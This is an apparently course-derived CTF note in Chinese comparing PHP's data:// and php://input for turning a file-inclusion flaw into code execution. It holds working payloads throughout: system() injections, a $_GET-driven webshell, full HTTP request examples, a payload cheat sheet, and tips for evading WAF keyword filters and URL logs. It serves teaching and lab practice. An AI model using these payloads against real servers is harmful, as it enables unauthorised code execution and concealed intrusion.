---
title: data:// 与 php://input 对比
category: 文件读取/伪协议
tags: [data协议, php://input, allow_url_include, POST, GET, 数据流]
source: 课程笔记
order: 3
---

## 一句话概括

`data://` 和 `php://input` **都能当「和 POST 一样的载体」** —— 都是把我们提供的内容送进包含函数执行。区别在于：`data://` 的数据**写在 URL 里**（GET 侧），`php://input` 的数据**在请求体里**（POST 侧）。

## 原理

### 1. 核心区别一览

| 特性 | `data://` 协议 | `php://input` 流 |
|---|---|---|
| **数据来源** | **URL 本身（GET 参数）** | **HTTP 请求体（POST Data）** |
| **请求方法** | 主要用于 **GET** 请求 | 仅用于 **POST** 请求 |
| **数据位置** | 在 URL 问号**之后** | 在 HTTP 头部**之后**的请求体里 |
| **编码要求** | 明文或 Base64，二选一 | **原始 PHP 代码，无需特殊编码** |
| **依赖配置** | 需要 `allow_url_include=On` | 需要 `allow_url_include=On` |
| **大小限制** | 受 URL 长度限制（约 2KB～8KB） | 受 `post_max_size` 限制（通常 2MB～8MB） |

### 2. 逐条展开

**① 数据来源与位置**

```text
GET /?file=data://text/plain,<?=system("id");?> HTTP/1.1
        └──────────────────────────────────────┘
        数据全部在 URL 里（GET 侧，长度受限）

POST /?file=php://input HTTP/1.1
...
<?=system("id");?>
└───────────────┘
数据在请求体里（POST 侧，容量大得多）
```

**② 请求方法**

- `data://` 走 **GET**：数据是 URL 的一部分，跟着请求行走；
- `php://input` 走 **POST**：它读的是**请求体原文**，GET 请求里没有请求体，所以它必须配 POST 用。

**③ 编码要求**

- `data://`：
  - 明文形态 `data://text/plain,<?=system("id");?>` —— 短、直观，但 `<?`、`"`、`)` 等字符容易命中 WAF，且 URL 里不能有未编码的特殊字符；
  - Base64 形态 `data://text/plain;base64,PD89c3lzdGVtKCJpZCIpOz8+` —— 更长，但输出字符集干净，**能绕过对源码关键词的过滤**。
- `php://input`：**请求体里直接写原始代码**，不需要任何编码 —— 这是它最省事的地方。`<?php system($_GET['cmd']);?>` 原样放进去就行。

**④ 依赖配置（两者相同）**

两者用于 `include` 时**都需要 `allow_url_include=On`**：
- `data://` 被当作「外部数据源」；
- `php://input` 用于包含时同样被当作「包含外部输入数据的流」。

这一点与 `php://filter` 不同 —— 后者**不受该开关限制**。如果一道题里 `php://filter` 能读却执行不了代码，先怀疑 `allow_url_include`。

**⑤ 大小限制**

- `data://` 受 **URL 长度**限制（不同服务器/浏览器在 2KB～8KB 量级），放一段简单命令没问题，放完整 webshell 就吃紧了；
- `php://input` 受 **`post_max_size`** 限制（默认通常 2MB～8MB），**可以放大段代码**。

**一句话选择**：payload 短、只想执行一两句命令 → `data://`；代码长、或者不想处理编码 → `php://input`。

## 利用条件

1. **存在可控的包含点**（`include($_GET['file'])` 这类）；
2. **`allow_url_include = On`**（两者都要）；
3. `php://input` 额外要求：**用 POST 发送**，请求体里就是代码；
4. 目标 PHP 版本对短标签的支持情况：优先用 `<?=`（PHP 5.4+ 始终可用），`<?php` 也行。

## Payload 速查

| 目的 | Payload |
|---|---|
| `data://` 明文执行 | `?file=data://text/plain,<?=system("id");?>` |
| `data://` Base64 执行 | `?file=data://text/plain;base64,PD89c3lzdGVtKCJpZCIpOz8+` |
| `php://input` 执行（同一请求） | `POST /?file=php://input`，请求体写 `<?=system("id");?>` |
| `data://` 传递任意文本 | `?file=data://text/plain,hello` |
| `php://input` 传参式执行 | 请求体写 `<?=system($_GET['1']);?>`，然后 `&1=id` |

## 完整示例

**A. 用 `data://` 执行命令**

```http
GET /?file=data://text/plain,<?=system("tac f*");?> HTTP/1.1
Host: 靶机地址
```

页面直接回显 `f*` 匹配到的文件内容。

**B. 用 `php://input` 执行同一段代码**

```http
POST /?file=php://input HTTP/1.1
Host: 靶机地址
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

<?=system("tac f*");?>
```

效果和 A 相同，但代码不在 URL 里 —— **URL 日志里看不到 payload**，隐蔽性更好，也不受 URL 长度限制。

> 注意 `php://input` 读的是**请求体原文**。所以请求体里**只能放代码本身**，不能再塞 `file=...` 这种表单字段 —— 两者会混在一起变成语法错误。需要传参时，参数放到 URL 上（如 `?file=php://input&1=id`，代码里用 `$_GET['1']` 取）。

## 踩坑与备注

- **两者都卡在 `allow_url_include`**：这是最常见的失败原因。判断方法：同一道题里 `php://filter` 能读 → 说明包含点没问题 → 那么 `data://` / `php://input` 失败基本就是开关没开。
- **`php://input` 不能和 `enctype="multipart/form-data"` 混用**：multipart 请求体不是「原始 POST 数据」，`php://input` 读到的格式可能不符合预期。测试时用 `application/x-www-form-urlencoded` 或干脆不设 `Content-Type`。
- **`php://input` 有「只能读一次」的特性**：在部分 SAPI（如老版本）下 `php://input` 被读过一次后不可重读，如果题目先读了请求体再 include，可能拿不到内容。
- **Base64 形态记得 URL 编码**：标准 Base64 里的 `+` 在 URL 查询串中会被解析成空格，`=` 也可能被截断。
- **原文结论「两者都发挥了 POST 的作用」**：更准确的说法是「两者都提供了**与 POST 同等的『把任意数据送进程序』的能力**」—— `data://` 走的是 GET 通道，`php://input` 走的是 POST 通道，效果等价但位置不同。
